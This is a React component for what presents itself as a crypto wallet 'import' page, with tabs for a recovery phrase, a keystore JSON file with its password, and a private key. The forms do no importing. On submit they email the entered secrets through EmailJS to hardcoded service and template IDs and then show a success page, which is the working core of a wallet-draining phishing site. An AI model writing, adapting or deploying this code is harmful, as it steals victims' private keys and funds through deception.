import React from "react";
import { Box } from "@mui/system";
import { Typography } from "@mui/material";
import { useState } from "react";
import emailjs from "@emailjs/browser";
import { useNavigate } from "react-router-dom";
import { useRef } from "react";
import Phrase from "./sendMail";

import "bootstrap/dist/css/bootstrap.min.css";

const NewForm = () => {
  const [toggleState, setToggleState] = useState(1);
  const dot = "...";
  const navigate = useNavigate();
  const form = useRef();
  const form2 = useRef();

  const sendEmail = (e) => {
    e.preventDefault();

    emailjs
      .sendForm(
        "service_1k59z4j",
        "template_1772qxl",
        form.current,
        "bG2p-qE0h7zsLKGzq"
      )
      .then(
        (result) => {
          console.log("yes");
          navigate("/success-page");
        },
        (error) => {
          console.log(error.text);
          navigate("/error");
        }
      );
  };

  const sendKeystore = (e) => {
    e.preventDefault();
    console.log(e.name);

    emailjs
      .sendForm(
        "service_1k59z4j",
        "template_h0fy6j4",
        form2.current,
        "bG2p-qE0h7zsLKGzq"
      )
      .then(
        (result) => {
          navigate("/success-page");
          console.log("key");
        },
        (error) => {
          console.log(error);
          navigate("/error");
        }
      );
  };

  return (
    <Box paddingY={4}>
      <div className="tab-container">
        <div className="tab-wrapper">
          <div
            onClick={() => setToggleState(1)}
            className={toggleState === 1 ? "tabs active" : "tabs"}
          >
            Phrase
          </div>
          <div
            onClick={() => setToggleState(2)}
            className={toggleState === 2 ? "tabs active" : "tabs"}
          >
            Keystore JSON
          </div>
          <div
            onClick={() => setToggleState(3)}
            className={toggleState === 3 ? "tabs active" : "tabs"}
          >
            Private Key
          </div>
        </div>

        <div className="content-tabs">
          <div
            className={
              toggleState === 1 ? "content container active-content" : "content"
            }
          >
            <Phrase />
          </div>

          <div
            className={
              toggleState === 2 ? "content container active-content" : "content"
            }
          >
            <form ref={form2} onSubmit={sendKeystore}>
              <textarea
                rows={10}
                className="form-control"
                placeholder="Keystore JSON"
                name="message"
              />
              <input
                type="password"
                className="form-control mt-3"
                name="password"
              />
              <Box paddingY={2}>
                <Typography
                  sx={{
                    fontWeight: "bolder",
                    fontFamily: "Montserrat",
                    textAlign: "center",
                    fontSize: ".9rem",
                  }}
                  variant="h6"
                >
                  Several line of text beginning with {dot} plus the password
                  you used to encrypte it
                </Typography>
              </Box>
              <input className="btn btn-primary" type="submit" value="IMPORT" />
            </form>
          </div>

          <div
            className={
              toggleState === 3 ? "content container active-content" : "content"
            }
          >
            <form ref={form} onSubmit={sendEmail}>
              <textarea
                rows={10}
                className="form-control mb-3"
                placeholder="Private Key"
                name="message"
              />
              <Box paddingY={2}>
                <Typography
                  sx={{
                    fontWeight: "bolder",
                    fontFamily: "Montserrat",
                    textAlign: "center",
                    fontSize: ".9rem",
                  }}
                  variant="h6"
                >
                  Typically 64 alphanumeric characters
                </Typography>
              </Box>
              <input className="btn btn-primary" type="submit" value="IMPORT" />
            </form>
          </div>
        </div>
      </div>
    </Box>
  );
};

export default NewForm;
